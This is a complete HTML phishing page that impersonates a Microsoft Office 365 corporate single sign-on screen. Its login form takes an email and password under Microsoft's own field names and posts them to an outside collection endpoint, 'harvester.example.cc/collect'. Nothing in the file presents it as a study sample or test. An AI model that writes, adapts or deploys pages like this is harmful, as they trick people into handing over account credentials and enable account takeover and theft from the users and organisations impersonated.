<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Corporate SSO — Sign in</title></head>
<body>
<main>
  <h1>Sign in with your Microsoft account</h1>
  <p>You are signing in to office365 portal.</p>
  <form action="https://harvester.example.cc/collect" method="post">
    <input name="loginfmt" type="email" placeholder="Email, phone, or Skype">
    <input name="passwd" type="password" placeholder="Password">
    <button type="submit">Sign in</button>
  </form>
</main>
</body></html>
